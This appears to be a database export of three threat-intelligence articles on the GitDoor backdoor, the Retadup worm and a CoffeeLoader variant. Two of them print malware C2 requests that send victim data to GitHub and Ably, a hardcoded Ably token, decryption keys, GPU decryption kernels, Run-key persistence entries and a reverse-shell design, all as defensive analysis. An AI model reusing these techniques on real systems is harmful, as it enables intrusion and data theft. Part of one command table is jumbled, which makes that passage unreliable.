articles.full_text:
Introduction

In early 2026, we identified a new, active intrusion campaign that we have named Operation ShadowCloud. The threat actor behind it is abusing the legitimate MeshAgent utility to drop two brand-new backdoors. These implants hide their command‑and‑control (C2) traffic behind cloud services Microsoft SharePoint, GitHub, and Ably, allowing the implants to blend in with normal traffic, effectively evading network-based detections.

We’ve called the implants GraphDoor and GitDoor, reflecting the cloud platform they use for C2. While their C2 protocols differ, the two backdoors share key capabilities:

On‑demand plug-in download: fetching additional modules as needed

In‑memory shellcode injection: loading malicious code directly into memory to extend functionality without touching the disk

The threat actor specifically deploys a modified Erfrp client and Ably messaging service-based plug-ins to proxy traffic between infected systems and C2 servers.

In addition to the plug-ins, we uncovered several shellcode families, most of them delivered as COFF (Common Object File Format) binaries. Our analysis reveals a sophisticated, modular toolset actively maintained and updated with multiple observed backdoor versions in the wild. We found victims in Asia and Africa, primarily within the government sector.

In a recent brief, Sophos touched on a fragment of this campaign. In this two‑part blog, we dive deeper, detailing the backdoors’ C2 communication methods, the assortment of shellcode families and plug-ins that the threat actor delivers to the compromised machines, and the infrastructure we observed supporting the operation. We also highlight the attribution clues:

This article (Part 1 of the story) deals with the initial infection vector, the GitDoor backdoor, and various shellcode families the threat actor drops onto target machines.

Part 2 provides details on the GraphDoor backdoor and the plug-in suite (Keylogging, Process Listing, Screen Capturing, Modified Erfrp Proxy, and Ably Channel Proxy) and examines the evidence that points to links with Chinese‑speaking threat groups.

Initial infection

During our investigation, we uncovered two separate instances of the MeshCentral Agent (MD5: 74b025084026d8d9a64661bf995d835b), which were launched inside a Taiwanese organization. MeshCentral is a web‑based tool that provides remote‑desktop control, command‑line access, and file‑management capabilities.

The exact entry point that let the attackers install the agent is unknown, but evidence points to the reuse of a prior infection already present on the network.

The MeshCentral Agent was hard‑coded to reach a remote server at wss://27.102.66[.]162:443/agent.ashx. Once the C2 session was established, the adversary used the agent to drop three additional items on the endpoint:

A legitimate binary used for DLL sideloading

A malicious loader DLL responsible for unpacking and executing further code

An encrypted file containing the core payload

1st Instance C:\windows\system32\start.exe: legitimate Sandboxie Start binary C:\windows\system32\sbiedll.dll: malicious loader C:\windows\system32\config.ini: encrypted backdoor file 2nd Instance C:\Windows\system32\dts\pc\apo4x\dtsapo4service.exe: legitimate Python application binary C:\Windows\System32\dts\pc\apo4x\python39.dll: malicious loader C:\Windows\system32\dts\pc\apo4x\config.ini: encrypted backdoor file

The threat actor used trusted executables to side-load malicious loader DLLs. We identified the following loaders used in these attacks: jli.dll, SbieDll.dll, python39.dll, WINMM.dll, and libcef.dll, which were dropped onto the host and then implicitly loaded by the respective legitimate binaries: the OpenJDK platform binary (javaw.exe, MD5: 8b78ef5609d942036e93721d75bd1f29), Sandboxie Start (start.exe, MD5: be739a7036dc8e2ee8608fba13c8c3a4), a Python application (pythonw.exe, MD5: 84802caf2579cfe7a38f079a64a3cd22), and the Sysinternals Screen Magnifier tool (zoomit.exe, MD5: d955d03104f988582cbd2967177693d3), which the attackers started as a Windows service.

Loaders

We discovered two distinct loaders, each using a different method to decode the encrypted backdoor payload. In both cases, the loader first decrypts the payload and then injects the resulting code into the current process’s memory. Loader (Type 1) employs a hybrid scheme: first running the data through an RC4 stream cipher and then applying an XOR mask, while Loader (Type 2) simplifies the process by using a straight XOR operation alone.

Type 1 Loader (MD5 32151547d912488ac5242731057170a3)

The loader jli.dll reads the file config.ini (MD5: 3896d44bc6d517291c60ee3f70543a31) located next to it using the native NtCreateFile/NtReadFile calls, then it transforms the obtained data through the following steps to generate the final backdoor:

Base64‑decodes the data with a custom character set (ABCDEFGHIJ01234ZYXWVUTSRQPONMLKzyxwvutsrqponmlkjihgfedcba98765/+)

Decrypts the first layer of encryption with a 16-byte RC4 key that varies across samples

Decrypts the second layer of encryption with a 16‑byte XOR key, which is also sample‑specific

Transforms the decrypted backdoor bytes by abusing the RtlEthernetAddressToStringA and RtlEthernetStringToAddressA APIs to evade defenses. First, RtlEthernetAddressToStringA is used to convert the decrypted backdoor bytes into an Ethernet MAC‑address string.

Convert bytes to MAC address string

Then RtlEthernetStringToAddressA is used to translate a human‑readable MAC address string into a six‑byte binary format, and the resulting bytes are written to memory newly allocated via an AllocADsMem API call.

Convert MAC address string to bytes

Finally, the loader changes the memory protection to PAGE_EXECUTE_READWRITE using VirtualProtect and jumps to the MZ header, which acts as a trampoline into bootstrap code. Since the decrypted backdoor executable is already in memory‑mapped format, the bootstrap code simply performs relocation, resolves imports, and, depending on whether the payload is an executable or a DLL, invokes its entry point. The bootstrap code dynamically resolves API addresses and uses CRC32 to compute a hash of each API name. Both the import library name and the associated API name are XOR‑decrypted with a hardcoded 7‑byte key \x11\xAF\xCE\xDC\xA6\x12\x05 before resolution.

Execution from MZ bytes

Another similar loader jli.dll (MD5: e9d4081fac4a5111e6856f333d490439) has a different approach to API resolution. It reads an encrypted blob from config.ini (MD5: b930fb3ab14fe45b378d5acfa6e0a763), which decrypts to bootstrap code together with a backdoor executable (GraphDoor MD5: 14ec33ea808e697870d00c5e434c2952), which can be either an EXE or a DLL. The bootstrap code resolves the required APIs using an FNV‑1 hash. In the API hashing function, the FNV_offset_basis value changes, but the FNV_prime constant always remains 0x1000193. Once the necessary functions are resolved, the bootstrap code creates a file-mapping object called Local\sm%lu (where %lu is the current PID). Next, it reflectively loads the backdoor into its own process space and jumps to the backdoor’s entry point. If the payload is a DLL and exports functions, each export name is hashed with FNV‑1 and compared against the hard‑coded value 0x974C9EB; a match triggers that export. For cleanup, the bootstrap invokes the DLL’s DllMain with DLL_PROCESS_DETACH, unloads any loaded libraries via FreeLibrary, and releases the allocated memory with VirtualFree.

Type 2 Loader (MD5 e63ec733393e4e7e3424cbff918003a3)

This loader is internally named SbieDll_st.dll. Before attempting to prepare and execute the backdoors, it performs a few checks on the infected machine. It first searches for the byte pattern \x48\x83\xC4\x68\xC3, which disassembles into the instructions shown below, inside KERNEL32.DLL and KernelBase.dll.

Pattern disassembly

If the pattern is found, the code first installs a vectored exception handler and clears the hardware breakpoint by zeroing the CONTEXT.DR7 register. It then verifies that the current process’s name matches a hard‑coded value. After passing these checks, it reads an encrypted blob from config.ini (MD5: 6a54f8008ee659b6923abf5dba2b2cc1) located in the module’s directory. Then it transforms the obtained data through the following steps:

Base64‑decoding the data

XOR‑decrypting it with a hardcoded 16‑byte key that changes per sample

The resulting data is a backdoor executable (GitDoor MD5: 552f0a9cc5fc3755721fa49be05e8035). The loader allocates memory in the current process, copies the decrypted backdoor code into that region, and starts a new thread at the MZ header, which acts as a trampoline into a bootstrap routine identical to that of the Type 1 loader. Before allocating memory and executing the backdoor code, the loader checks the OS version; on Windows 8 (6.2) or newer, it uses the native APIs NtAllocateVirtualMemory, RtlMoveMemory, and NtCreateThreadEx for memory allocation and code execution, while on older systems it falls back to the standard APIs VirtualAlloc, RtlMoveMemory, and CreateThread.

Backdoors

Both GitDoor and GraphDoor incorporate several encryption and obfuscation techniques, including Control Flow Flattening, which obscures their genuine execution flow. They also make heavy use of indirect calls: most routines are encapsulated in several layers of helper functions that invoke one another in sequence, creating extra levels of indirection. The core payload lives deep inside these nested wrappers, which forces analysts to follow each wrapper to understand the real backdoor behavior, greatly hindering static analysis.

Execution is split across multiple threaded components. Every thread is an instance of a Client class in the ably namespace. Both the class and namespace identifiers stem from mangled C++ thread function names, and the accompanying lambda names expose the precise malicious capabilities each thread implements.

GitDoor (MD5 552f0a9cc5fc3755721fa49be05e8035)

The backdoor first decrypts every element required to contact the GitHub C2 – its repository URL, the personal access token, the User‑Agent string, and the necessary HTTP headers. The backdoor utilizes two distinct repositories: one serves as a drop point for receiving command payloads, and the other is used to upload the results of those commands.

/repos/LatonyCharnleyaW/Havo: download the command data and plug-ins

/repos/LatonyCharnleyaW/Trix: upload the victim’s information and the command result

The User-Agent string is:

Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.6261.96 Safari/537.36

The backdoor decrypts the hard‑coded configuration details, appends them to the victim’s collected system information, and then uploads the combined data to the GitHub repository as well as the Ably cloud – the detailed preparation and upload process is described below.

Hardcoded Details "type":"serv" "client_version":"1.1.6" "dhj_exe":"start.exe" "execution_method":"1" "is_need_lock":"false" Victim Information Public IP Internal IP Domain Username Hostname Current working directory Backdoor process name and process ID Windows version CPU type Running process name

The backdoor builds a random eight‑character identifier that uniquely tags the compromised host and creates a fresh GUID to mark the active communication session. Every HTTP call includes a newly generated random string inserted into the X‑CSRF‑TOKEN header. The malware then issues a POST request to GitHub, using the GitHub API to open a new issue in the Trix repository belonging to the LatonyCharnleyaW user/organization. This request creates a new GitHub issue with the Title and Body values shown below. The malware extracts the number field from the JSON response, which represents the issue number and will be used in subsequent requests.

Title: “problem [GUID]”.

Body: “code [victim unique code]”

POST /repos/LatonyCharnleyaW/Trix/issues Host: api.github.com Authorization: token %github_pat_token% Accept: application/json User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.6261.96 Safari/537.36 X-CSRF-TOKEN: %random string% Content-Type: application/json {"body":"code %victim_unique_code%","title":"problem %generated GUID%"}

The backdoor also connects to Ably at rest.ably.io using a hardcoded authorization token. This token is Base64‑encoded, and after decoding, it reveals the Ably API key, which contains the following information:

App ID: identifies your specific Ably application

Key ID: identifies the specific key within that app

Key Secret: the private secret used for signing requests

The backdoor then builds a unique filename in the format main.%victim_unique_code%.js.map, where %victim_unique_code% corresponds to the value reported when the GitHub issue is created. This file holds the harvested victim system information in both the Ably cloud and the GitHub repository. Prior to the upload, the victim system information is encrypted with AES‑256‑ECB using a randomly generated key. The ciphertext is Base64‑encoded and wrapped in a JSON object (see the example below).

{"key" : "<%randomly generated AES key%>", "sec" : "<%AES-encrypted and base64-encoded victim system information%>"}

After that, the entire JSON payload is XOR‑encrypted with the previously built unique filename, Base64‑encoded once more, and finally sent via a POST request to the Ably service and via a PUT request to the GitHub repository.

Below is the POST request that sends the encrypted victim data to the Ably cloud.

POST /messages Host: rest.ably.io Accept: application/json Authorization: Basic VHVGY3FnLjlId1ZxQTpIVmJEdnUwb1JidG1YQThybE1TVzM1QUJNUjZoOFMxLVMtZnpMVkFYY0dr Content-Type: application/json [{"channels":"data:main.%victim_unique_code%.js.map","messages":{"data":{"content":{%encrypted collected victim system info%},"name":"part-1"}}}]

After the data is sent to the Ably cloud, the malware queries /channels/comm/messages?limit=50, exposing the channel name comm. This request serves as a status check, pulling any error or success responses. If the response indicates a failure, the malware retries by posting the same payload to /channels/data/messages.

To upload the collected victim system information to the GitHub repository, the backdoor first issues a GET request to /repos/LatonyCharnleyaW/Trix/contents/main.%victim_unique_code%.js.map to see whether the file main.%victim_unique_code%.js.map already exists. If the request returns “not found”, the malware follows up with a PUT request (see the example below) that creates the file in the repository to store the victim’s information.

PUT /repos/LatonyCharnleyaW/Trix/contents/main.%victim_unique_code%.js.map Host: api.github.com Authorization: token %github_pat_token% Accept: application/json User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.6261.96 Safari/537.36 X-CSRF-TOKEN: %random string% Content-Type: application/json {"content":"%encrypted collected victim system info%","message":"commit from INSOMNIA"}

Once the victim’s system information is successfully uploaded, or if the file already exists, the malware downloads two plug-ins that perform screen‑capture (scr.ts) and process enumeration (pr.ts).

To download each plug-in, the backdoor first decrypts the plug-in’s filename as well as the corresponding GitHub repository path, then issues a GET request to fetch the encrypted content of the plug-in.

Below are the HTTP requests to download the scr.ts and pr.ts plug-ins.

GET /repos/LatonyCharnleyaW/Havo/contents/scr.ts Host: api.github.com Authorization: token %github_pat_token% Accept: application/vnd.github.raw+json User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.6261.96 Safari/537.36 X-CSRF-TOKEN: %random string% GET /repos/LatonyCharnleyaW/Havo/contents/pr.ts Host: api.github.com Authorization: token %github_pat_token% Accept: application/vnd.github.raw+json User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.6261.96 Safari/537.36 X-CSRF-TOKEN: %random string%

The plug-in utilizes a custom, two‑stage decryption routine to unpack its payload:

Stage 1 (AES-256-ECB): the ciphertext is decrypted in 16‑byte blocks using the hard‑coded key: 12345678901234567890123456789012.

Stage 2 (Proprietary Cipher XOR): the output from Stage 1 undergoes a rolling XOR operation using 16‑byte keys. The first block is decrypted using a static initialization key (\x65\x3c\x40\x16\x3d\x38\x20\xa4\x47\x14\x54\xb4\x37\x5a\x3b\x38). For all subsequent blocks, the routine uses a chaining effect where the key is derived from the ciphertext of the immediately preceding block.

Once decrypted, the resulting bytes constitute the plug-in’s shellcode, which the backdoor loads directly into memory.

After loading the plug-ins, the backdoor sends a POST request to apply the bug label to the newly created issue (identified by its issue number). The request is shown below.

POST /repos/LatonyCharnleyaW/Trix/issues/<issue_number>/labels?rd=%random alphanumeric characters% HTTP/1.1 Host: api.github.com Connection: Keep-Alive Content-Type: application/json Accept: application/json Authorization: token %github_pat_token% User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.6261.96 Safari/537.36 X-CSRF-TOKEN: %random string% Content-Length: 18 {"labels":["bug"]}

If the issue already has the bug label, the backdoor issues a DELETE request to remove that label.

DELETE /repos/LatonyCharnleyaW/Trix/issues/<issue_number>/labels/bug?rd=%random alphanumeric characters% HTTP/1.1 Host: api.github.com Connection: Keep-Alive Content-Type: application/json Accept: application/json Authorization: token %github_pat_token% User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.6261.96 Safari/537.36 X-CSRF-TOKEN: %random string%

The label‑or‑unlabel issue request is always followed by a GET request that pulls the contents of the Havo repository.

GET /repos/LatonyCharnleyaW/Havo/contents HTTP/1.1 Host: api.github.com Connection: Keep-Alive Content-Type: application/json Accept: application/json Authorization: token %github_pat_token% User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.6261.96 Safari/537.36 X-CSRF-TOKEN: %random string%

The backdoor continuously sends both requests – labeling/unlabeling the issue as a bug and fetching the repository contents – until it receives an exit command.

The content retrieval request returns a JSON array that lists filenames together with a number of other details, including the path to download the file. Every file in the list contains command data to be processed. The backdoor extracts the name property to get each filename, then searches the names for the unique victim code string. When it finds a match, it fetches that file via /repos/LatonyCharnleyaW/Havo/contents/<filename> and processes the command data as described in the Command processing section.

Command processing

As described earlier, the command input and its result are stored in separate GitHub repositories. In the analyzed sample, the command input is retrieved from the public Havo repository, while the command result is uploaded to the private Trix repository, which requires a GitHub personal access token for access. The command and its associated data can be retrieved from the GitHub repository by accessing the corresponding files as shown in the table below. The command‑input file follows the naming pattern main.<%victim_unique_code%>.<%random 4‑character string%>.js.<%extension%>, where <%victim_unique_code%> is the identifier reported when a GitHub issue is created, and <%extension%> specifies the command data type: kmap for keylogger data, pmap for proxy data, apmap for Ably proxy data, swp and tmp for file‑manager data, and “no extension” for shellcode data where the filename ends in .js without any extra extension.

Command type

Example GitHub path

Load Shellcode command

/repos/LatonyCharnleyaW/Havo/contents/main.w8i6lyr9.rikh.js

Keylogger command

/repos/LatonyCharnleyaW/Havo/contents/main.r256zin8.xuqa.js.kmap

Proxy command

/repos/LatonyCharnleyaW/Havo/contents/main.PW7ickVf.ym30.js.pmap

Ably proxy command

/repos/LatonyCharnleyaW/Havo/contents/main.w5y2t1qs.n4wq.js.apmap

Filemanager command

/repos/LatonyCharnleyaW/Havo/contents/main.hmxjfyrc.q4d0.js.swp

Filemanager command

/repos/LatonyCharnleyaW/Havo/contents/main.hmxjfyrc.bmns.js.tmp

The file content is Base64‑decoded and then XOR‑decrypted with the filename as the XOR key. This yields JSON data in the format shown below, which contains an AES key and command data that is both Base64‑encoded and AES‑encrypted.

{"key" : "<%AES key%>", "sec" : "<%base64-encoded and AES-encrypted command data%>"}

For each type of command, several commands are available. Below is a description of the supported commands for each command type:

Command type

Supported commands

Filemanager

createFolder: create a folder at a specified location

loadDrives: retrieve a list of drive names

scanDir: list the files and folders at a specified location

deleteFile: delete a specified file

uploadFile: create a file at a specified location. The data to be written to the file is received in chunks from the C2

The configuration contains serverAddr, serverPort, remote_port, socks5_user, and socks5_password fields. Next, download the channel.ts proxy plug-in from the Havo GitHub repository (in the analyzed sample) and finally inject the downloaded plug-in code into memory

If the shared memory contains the string True, send the string connected along with the proxy configuration

If the shared memory contains the string False or connecting, send the string not connect

For any other string, send the string Connecting

Ably Proxy

Next, download the abchannel.ts Ably proxy plug-in from the Havo GitHub repository (in the analyzed sample) and finally inject the downloaded plug-in code into memory.

stop: write the string False to the shared memory and set the Ably proxy status to Disable

status: if the Ably proxy is running, set the status to Enable; otherwise, set it to Disable

If the shared memory contains the string True, send the string connected

If the shared memory contains the string False or connecting, send the string not connect

For any other string, send the string Connecting

Load Shellcode

exit: terminate the backdoor

sleep: put the backdoor into a sleep state for a specified time interval

scload: the input consists of Base64‑encoded COFF (Common Object File Format) bytes and optional payload arguments. The COFF bytes are Base64-decoded, loaded into memory, and the entry‑point function go is invoked. Any supplied arguments are also Base64‑decoded and passed to the go function

smload: the input data includes Base64‑encoded payload bytes and optional payload arguments. After decoding, the payload bytes may be an MZ executable or shellcode (consisting of a stub and executable code), which are injected into memory. The payload arguments are Base64‑decoded and written to the shared memory segment named Local\sm<%current_process_id%>

Custom shellcodes

Our analysis uncovered several custom shellcodes authored by the threat actor, each designed for a specific function (see the list below). Based on their operational logic, these shellcodes can be grouped into the following broad categories:

Category

Shellcode modules

Process Injection Techniques

CreateRemoteThread: implements the Windows remote‑thread creation technique for process injection

NtQueueApcThread: implements the APC (Asynchronous Procedure Call) injection technique using NTDLL syscalls (not via the Windows API)

Network Activity

Netstat: displays active TCP connections with process information, similar to the Windows netstat command

Procdump: dumps the memory of the process with a specified process ID into a designated file

Command Shell Activity

Execute command: uses cmd.exe to execute a specified command

WinPTY shell: creates a fully interactive reverse shell using WinPTY; it supports the following:

Initialization: decodes the hard‑coded Base64 strings for the binaries winpty.dll (the core WinPTY library) and winpty‑agent.exe (the helper executable for terminal management), then drops both files into the %TEMP% directory

Setup: loads WinPTY, creates a terminal configuration, and sets the terminal size to 80 × 25

Spawn: launches cmd.exe with correctly configured pipes

Communication: starts the reader and writer threads. The writer thread listens on \\\\.\\pipe\\MyInputPipe and waits for commands from the C2 server

Wait: monitors for exit conditions. When the string hklnwqxaa123 is received from the C2 server, it sends exit\r and terminates

articles.title: The Retadup worm revives from old USB drives to download CoffeeLoader | Kaspersky official blog
articles.context: At first glance, the risk of malware seems close to zero
articles.full_text:
Mass-distributed malware usually spreads in short-lived waves. Cybersecurity companies typically catch any given malware sample within hours or days, so malware creators have to keep churning out new versions. The same goes for command-and-control (C2) servers on the internet, which send instructions to malware and receive stolen data back. And these servers change very often, because hosting providers block the old addresses.

So what happens when you fire up a really old computer, or plug in a thumb drive that has spent five years gathering dust on a shelf? At first glance, the risk of malware seems close to zero. You’d think that after all these years, every antivirus product has every Trojan pegged, and the C2 servers have been sent to the scrapyard. The reality isn’t so simple, and you really can’t afford to let your guard down. A recent example — the Retadup malware — shows exactly why.

The rise and fall of Retadup

One threat that may well be lurking on an old USB stick is the Retadup computer worm. This malware was widespread in 2017. It was written with AutoIt — a legitimate, popular automation tool. When launched, the worm copies itself to every connected flash drive and external disk as hidden files and shortcuts (LNK files). If you plug that drive into a new computer and click the shortcut, the worm sets up shop there, and the cycle starts all over again.

Every computer infected with Retadup was drafted into a botnet that could download and run additional malware on the operator’s command.

In 2019, French law enforcement took the botnet down. The National Gendarmerie seized the C2 servers and used them to tell every bot to self-destruct. As soon as an infected computer checked in with the server for new commands, it was instructed to wipe the worm from the system. Soon after, more than 850 000 computers were disinfected, and the botnet effectively ceased to exist.

Retadup rises from the grave

Every online computer infected with Retadup was disinfected in 2019. But infected flash drives could well have kept copies of the worm. The worm could also have survived on computers that had no internet access or were simply switched off for the duration of the French operation. As it turns out, there were quite a few of these cases.

In 2024, someone started re-registering the domain names that Retadup’s C2 servers once used. When the previous owner stops renewing and paying for a domain name, it eventually becomes available to anyone. Hosting providers’ blocks on expired domains get lifted too. Attackers often take advantage of this. But this time they didn’t grab the name of a popular brand. They went for C2 server names known since 2019, such as alphanoob and radnewage in the .com top-level domain. A Retadup C2 server was then relaunched on these re-registered domains. It could’ve been the worm’s original author or another attacker, since Retadup’s command set and encryption type are very simple.

Now, as soon as someone plugs an infected USB stick into a computer, the old copy of the worm launches, knocks on the C2 server’s door, and… gets a valid response! The response tells the bot to download additional malware. At the moment, that is the far more modern CoffeeLoader.

Of course, what’s left of the botnet is a shadow of its 2019 self. Still, in the first nine months of 2026, Kaspersky products blocked about 15 000 Retadup infection attempts. The worm has been detected primarily in Peru, Angola and Russia.

A coffee nobody ordered

CoffeeLoader, which hitches a ride on Retadup, shows how much more sophisticated cybercriminals’ tools have become. Its end goal is also to download more malware. But first it has to dig in on the infected system and stay under the radar. To do that, CoffeeLoader arrives as a chain of encrypted code fragments, which use graphics card functions to decrypt themselves. This helps the malware slip past detection methods that run a suspicious file in a virtual environment (a sandbox). This detection technique is often used by malware analysts and cybersecurity teams at large companies. If CoffeeLoader successfully decrypts all of its initial components, it adds itself to system startup, and modifies the registry so the user can’t remove the component that launches automatically. After that, CoffeeLoader receives encrypted, digitally signed commands from the server. These let it download and run any other software the attackers want — like infostealers or ransomware.

How to protect yourself from retro malware

The age of a flash drive or computer is no indication of how safe it is. Old malware can lie dormant for years until someone runs it, and then roll out the red carpet for far more modern threats. So before you dig through your digital archives, take a few precautions.

Install updates for your operating system and security software, and update your antivirus databases.

Use a comprehensive security suite on all your computers — including Macs and Linux machines. We recommend Kaspersky Premium, which successfully blocks attacks by Retadup and CoffeeLoader, among other threats.

Turn off autorun for removable media. An autorun infection may seem a relic of the last century, but it is still going strong.

Scan the flash drive before opening any files. Run a full antivirus scan on the drive first, and only then browse its contents. Don’t turn off your protection just because it’s blocking a file you “really need” to open.

Don’t trust file icons. A shortcut with a folder icon isn’t necessarily a folder. Make file extensions visible. If you’re not sure what they’re for, don’t run shortcuts (LNK), applications, or scripts from old drives.

Don’t rush to connect an old computer to the internet. Check it first — for example, with a bootable antivirus drive created on another computer that you know is clean.

Keep backups of your important data separate. At least one copy should be out of reach of your main computer, so it can’t be changed from there — for example, on an external drive that stays unplugged. That copy will be your safety net if ransomware does get onto your computer.

Let’s dust off a few more old-school malware families. Who knows, maybe they’re not as outdated as they seem.

articles.full_text:
In August 2026, we detected a new variant of the CoffeeLoader malware in the wild. On launch, the NSIS-based installer executable dropped a file named 7z.dll into a temporary directory and ran it through rundll32.exe. The 7z.dll file was a patched version of the original library of the popular 7-Zip archiver. Part of its code had been replaced with malicious self-decrypting shellcode that turned out to be a new version of the Armoury packer. This packer was also previously used in the CoffeeLoader Trojan.

New Armoury variant

The old variant of the Armoury packer used the GPU to decrypt the Trojan’s main body, relying on the OpenCL library, which implements the standard of the same name for high-performance computing.

__kernel void f(__global char* a,__global char* b,__global char* c,int d) { c[get_global_id(0)] = a[get_global_id(0)] ^ b[get_global_id(0) % d]; }

The new variant also utilizes the GPU, but instead of OpenCL, it uses the OpenGL library, which implements the eponymous standard for applications that work with 2D and 3D graphics.

layout(local_size_x = 256) in; layout(std430, binding = 0) buffer DataBuffer { uint data[]; }; layout(std430, binding = 1) buffer KeyBuffer { uint key[]; }; layout(std430, binding = 2) buffer ResultBuffer { uint result[]; }; void main() { uint index = gl_GlobalInvocationID.x; if (index >= data.length()) { return; } uint dataValue = data[index]; uint keyValue = key[index]; result[index] = dataValue ^ keyValue; }

The Armoury payload has also changed. Previously, it was a DLL containing two shellcode fragments and the main body of CoffeeLoader. The first shellcode is a dropper responsible for installing the Trojan and gaining persistence. To do this, it copies the library to Windows folders and adds it to autorun. The second is a stager that creates a new dllhost.exe process and injects the main body of CoffeeLoader into it; in this variant, the main body is an executable file. Unlike the old version, the new version of the packer delivers yet another shellcode.

CoffeeLoader downloader

The shellcode decrypted by the Armoury packer is a new intermediate link in the infection chain: the CoffeeLoader downloader. It fully incorporates the dropper and stager functionality described above, as well as downloader functions used to fetch the Trojan’s main body.

New CoffeeLoader downloader viewed in a text editor

To establish persistence, the Trojan copies 7z.dll to subfolders of %PROGRAMDATA% or %LOCALAPPDATA%. The Run registry key is used for autorun. The subfolder, library, and registry value are named with eight hexadecimal digits generated from system volume information.

C:\ProgramData\b79faace\b79faace.dll C:\Users\[username]\AppData\Local\b79faace\b79faace.dll

Software\Microsoft\Windows\CurrentVersion\Run 'b79faace.dll' = 'rundll32.exe "C:\ProgramData\b79faace\b79faace.dll",SetCodecs'

To protect itself, the downloader creates a registry key that prevents the user from disabling autorun through Task Manager.

Software\Microsoft\Windows\CurrentVersion\Explorer\StartupApproved\Run 'b79faace.dll' = [080000000000000000000000]

Once persistence is established, the malware launches one of several processes (dllhost.exe, WerFault.exe, svchost.exe, OpenWith.exe, or AtBroker.exe), injects itself into it, and downloads the Trojan’s main body from a hardcoded C2 server address. The download is performed over HTTPS using the /payload?md5= path. On the first request to the server, the md5 parameter is set to zeros. On subsequent requests, it contains the hash of the previously downloaded payload.

Example of a request to download the main body of CoffeeLoader:

GET /payload?md5=00000000000000000000000000000000 HTTP/1.1 Connection: Keep-Alive User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:152.0) Gecko/20100101 Firefox/152.0 Host: api.internet-speed-check.com

Example of a server response:

HTTP/1.1 200 OK Date: Tue, 29 Sep 2026 14:34:25 GMT Content-Type: application/octet-stream Content-Length: 60800 Connection: close Server: cloudflare x-content-md5: d7785198d9341310978e4cedc7bdb735 x-signature: MEUCIDQNr86sBN3hmnLarIuPJ2WJEtXeIdnfsR4AkHUBI0AtAiEAyV5o2VM+LPDbme8nYdRydkrtI02TzyNdKh7+AdvPzUs= strict-transport-security: max-age=63072000; includeSubdomains x-frame-options: DENY x-content-type-options: nosniff cf-cache-status: DYNAMIC Nel: {"report_to":"cf-nel","success_fraction":0.0,"max_age":604800} Server-Timing: cfCacheStatus;desc="DYNAMIC" Server-Timing: cfEdge;dur=4,cfOrigin;dur=66 Report-To: {"group":"cf-nel","max_age":604800,"endpoints":[{"url":"https://a.nel.cloudflare.com/report/v4?s=AAAAAAAA"}]} CF-RAY: cf27d75a42bb5669-MIA alt-svc: h3=":443"; ma=86400

In response to the request, the C2 returns encrypted shellcode that contains the main body of the Trojan. The payload is encrypted with a simple XOR, and the first 16 bytes of the downloaded data serve as the key.

The HTTP response header also contains two fields: X-Signature and X-Content-MD5. The first contains a signature for the downloaded data, which is verified with a public key embedded in the Trojan.

RUNTMSAAAAC2gVlbqvpsSutLE0/4ogdQ20Uw4qQyQQCw7448NvjMOaYWr+mlrvWiDCg79jWIhjiIuGuqxTb9VMsuceH4WyA5

The second field contains the MD5 checksum of the decrypted payload body.

If both the signature and the checksum checks pass, the Trojan allocates executable memory in its own process and transfers control to the downloaded and decrypted shellcode.

Main CoffeeLoader module

Once it gains control, the shellcode decrypts and sets up the main body of CoffeeLoader, then passes control to it. The Trojan itself hasn’t changed much since previous campaigns. In the new version, the attackers use different keys to encrypt requests to the C2 and decrypt its responses: A21251838432306F2CD2540593656B9E and 2026F751079659CF71C7BA64B345C12A.

Certificate validation during the connection to the C2 has been replaced with signature verification of the C2 responses, which relies on the public key 23:6A:0D:E7:E0:FA:20:BC:0F:F4:7C:F6:8F:49:89:A8:10:BE:91:F0:0F:C2:F3:99:4D:46:F7:DF:D2:33:0B:00:6D:54:7A:AA:92:45:89:16:84:48:2E:AF:B8:F7:75:8A:4C:39:07:C5:24:EA:9D:3A:C6:FD:13:61:7D:54:19:FA. The binary communication protocol no longer uses the magic constant 0xC0FFEE42, which gave the malware its name: it now uses the far less telling value 0xD1D57871.

However, we found no changes in functionality. The code contains the same three previously described commands for running a payload received from the C2: injecting it into a process, saving it to disk as an executable and then running it, or saving it as a DLL and running it via rundll32.exe.

Distribution and initial infection

The most notable finding was how exactly this CoffeeLoader variant spreads. Malware is most often distributed through email attachments, websites posing as free software download portals, ad banners that send users who click them through a chain of redirects to phishing resources, pirated software, and so on. CoffeeLoader infections, however, come from the Retadup worm.

Retadup is a malicious computer worm first discovered in 2017. It was written in the AutoIt and AutoHotkey scripting languages. Once on a victim’s device, it copied itself to all connected USB flash drives and external drives as hidden files and shortcuts (LNK files). When a user opened the infected flash drive on another PC and clicked the shortcut, the worm made its way onto the new device. Systems infected with Retadup were joined into a botnet that could download and run additional malware on the operator’s command.

In July 2019, French law enforcement gained access to Retadup’s C2 servers and took control of the botnet. As soon as an infected computer checked in with the server for new commands, it was instructed to wipe the worm body from the system. Within just a few weeks, more than 850,000 machines were disinfected, and the botnet ceased to exist… until 2024.

Two years ago, someone began re-registering the domain names that Retadup had used as C2 servers and using them to issue commands to download third-party malware. At first, this was the SmokeLoader downloader packed using the 32-bit version of Armoury, but in early 2025, the same servers started serving CoffeeLoader.

We don’t know whether it was the worm’s author or someone else that decided to revive the C2 servers, since Retadup’s C2 protocol is fairly simple: it consists of plaintext commands encoded with Base64 and then converted to hex.

Below is an example of traffic from a 2017 Retadup variant that still communicates successfully with its C2 in 2026.

